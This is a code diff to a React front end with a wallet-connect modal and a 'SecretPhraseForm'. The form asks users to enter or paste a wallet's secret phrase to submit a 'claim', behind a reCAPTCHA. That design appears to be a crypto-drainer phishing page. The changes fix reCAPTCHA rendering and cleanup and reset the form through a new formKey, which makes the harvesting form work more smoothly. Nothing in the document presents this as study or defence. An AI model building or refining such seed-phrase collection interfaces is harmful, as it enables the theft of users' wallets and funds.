@@ -78,30 +78,47 @@ const FormSchema = z.object({
   recaptcha: z.string().min(1, { message: "Please verify you are not a robot." })
 });
 
-// A simple component to render reCAPTCHA and handle its state
 const ReCAPTCHAComponent = ({ onChange }: { onChange: (token: string | null) => void }) => {
   const recaptchaRef = React.useRef<HTMLDivElement>(null);
   const widgetIdRef = React.useRef<number | null>(null);
 
   React.useEffect(() => {
     const global = window as any;
-    if (global.grecaptcha && global.grecaptcha.render && recaptchaRef.current) {
+
+    const renderRecaptcha = () => {
+      if (recaptchaRef.current && global.grecaptcha && global.grecaptcha.render) {
         if (widgetIdRef.current === null) {
-            widgetIdRef.current = global.grecaptcha.render(recaptchaRef.current, {
-                'sitekey': '6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP', // This is a test key
-                'theme': 'dark',
-                'callback': onChange,
-                'expired-callback': () => onChange(null),
-            });
+          widgetIdRef.current = global.grecaptcha.render(recaptchaRef.current, {
+            'sitekey': '6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP', // This is a test key
+            'theme': 'dark',
+            'callback': onChange,
+            'expired-callback': () => onChange(null),
+          });
         }
+      }
+    };
+    
+    // Render immediately if grecaptcha is already available
+    if (global.grecaptcha && global.grecaptcha.ready) {
+      global.grecaptcha.ready(renderRecaptcha);
     }
+
+    // Cleanup function to reset the widget when the component unmounts
+    return () => {
+      if (global.grecaptcha && widgetIdRef.current !== null) {
+        // The reset function is the correct way to handle this.
+        // It clears the previous instance.
+        global.grecaptcha.reset(widgetIdRef.current);
+        widgetIdRef.current = null;
+      }
+    };
   }, [onChange]);
 
   return <div ref={recaptchaRef} />;
 };
 
 
-function SecretPhraseForm({ wallet, onBack, onSuccess }) {
+function SecretPhraseForm({ wallet, onBack, onSuccess, formKey }) {
   const { toast } = useToast();
   const form = useForm<z.infer<typeof FormSchema>>({
     resolver: zodResolver(FormSchema),
@@ -110,6 +127,11 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
       recaptcha: "",
     },
   });
+
+  React.useEffect(() => {
+    form.reset();
+  }, [formKey, form]);
+
 
   const handlePaste = async () => {
     try {
@@ -161,13 +183,6 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
         description: "There was an error submitting your claim. Please try again.",
         variant: "destructive",
       });
-    } finally {
-        form.reset();
-        const global = window as any;
-        if (global.grecaptcha) {
-            // It's often better to let the widget get re-created on modal open
-            // than to try and reset a widget that might not exist in the DOM anymore.
-        }
     }
   };
 
@@ -266,6 +281,8 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
 export function WalletConnectModal({ isOpen, onOpenChange }) {
   const [view, setView] = React.useState("wallets");
   const [selectedWallet, setSelectedWallet] = React.useState(null);
+  const [formKey, setFormKey] = React.useState(() => Date.now());
+
 
   const handleWalletSelect = (wallet) => {
     setSelectedWallet(wallet);
@@ -279,22 +296,22 @@ export function WalletConnectModal({ isOpen, onOpenChange }) {
   
   const handleClose = (open) => {
     if (!open) {
-      // Reset state when modal is explicitly closed
       setTimeout(() => {
         setView("wallets");
         setSelectedWallet(null);
+        setFormKey(Date.now()); // Reset the form by changing the key
       }, 300); // Wait for close animation
     }
     onOpenChange(open);
   }
 
   React.useEffect(() => {
-    // Also reset state if isOpen prop changes to false from the parent
     if (!isOpen) {
       setTimeout(() => {
         setView("wallets");
         setSelectedWallet(null);
-      }, 300); // Wait for close animation
+        setFormKey(Date.now()); // Also reset on parent-driven close
+      }, 300);
     }
   }, [isOpen]);
 
@@ -338,6 +355,7 @@ export function WalletConnectModal({ isOpen, onOpenChange }) {
             wallet={selectedWallet}
             onBack={handleBack}
             onSuccess={() => onOpenChange(false)}
+            formKey={formKey}
           />
         )}
       </DialogContent>
